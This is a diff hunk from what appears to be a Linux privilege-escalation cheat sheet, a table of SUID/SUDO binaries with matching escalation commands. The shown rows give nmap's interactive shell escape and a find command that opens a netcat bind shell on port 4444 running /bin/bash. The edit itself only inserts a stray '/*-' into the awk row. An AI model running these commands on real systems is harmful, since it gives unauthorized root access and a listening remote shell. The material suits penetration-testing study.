@@ -35,7 +35,7 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 | SUID / SUDO Executables               | Priv Esc Command                                                                    |
 |---------------------------------------|-------------------------------------------------------------------------------------|
 | nmap<br>(older versions 2.02 to 5.21) | nmap --interactive<br>!sh                                                              |
-| awk                                   |                                                                                     |
+| awk                                   |                    /*-                                                                 |
 | python                                |                                                                                     |
 | perl                                  |                                                                                     |
 | find                                  | find /home -exec nc -lvp 4444  -e /bin/bash \\;<br> find /home -exec /bin/bash \\;  |
